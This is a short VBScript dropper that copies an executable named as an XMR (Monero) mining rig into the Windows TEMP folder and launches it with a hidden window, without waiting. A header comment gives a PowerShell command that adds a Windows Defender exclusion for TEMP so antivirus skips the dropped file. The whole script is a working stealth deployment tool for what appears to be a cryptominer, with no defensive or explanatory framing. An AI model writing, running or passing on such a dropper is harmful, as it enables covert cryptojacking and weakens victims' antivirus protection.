Option Explicit
' Copy XMR_Rig_6.26-Deploy-75.exe from this script's own folder into TEMP and run it.
'
' No window: wscript.exe is a GUI-subsystem host, so launching this .vbs the
' normal way (double click, or `wscript X.vbs`) never creates a console at all.
'
' The exclusion that matters is TEMP itself, not this folder.  Needs admin:
'   Add-MpPreference -ExclusionPath "$env:TEMP"

Dim fso, sh, here, src, tempDir, dst

Set fso = CreateObject("Scripting.FileSystemObject")
Set sh  = CreateObject("WScript.Shell")

here    = fso.GetParentFolderName(WScript.ScriptFullName)
src     = fso.BuildPath(here, "XMR_Rig_6.26-Deploy-75.exe")
tempDir = sh.ExpandEnvironmentStrings("%TEMP%")
dst     = fso.BuildPath(tempDir, "XMR_Rig_6.26-Deploy-75.exe")

If Not fso.FileExists(src) Then
    MsgBox "XMR_Rig_6.26-Deploy-75.exe was not found next to this script:" & _
           vbCrLf & vbCrLf & src, vbCritical, "XMR Rig"
    WScript.Quit 1
End If

' True = overwrite.  This is a copy, not a move, so the file next to the
' script survives -- swap CopyFile for MoveFile if you really want it gone.
On Error Resume Next
fso.CopyFile src, dst, True
If Err.Number <> 0 Then
    MsgBox "Could not copy the deploy exe into TEMP." & vbCrLf & vbCrLf & _
           dst & vbCrLf & Err.Description, vbCritical, "XMR Rig"
    WScript.Quit 1
End If
On Error GoTo 0

' 0 = hidden window, False = do not wait.  The exe is GUI-subsystem, so it
' would show nothing anyway; the 0 is here for the case where it is not.
sh.Run """" & dst & """", 0, False
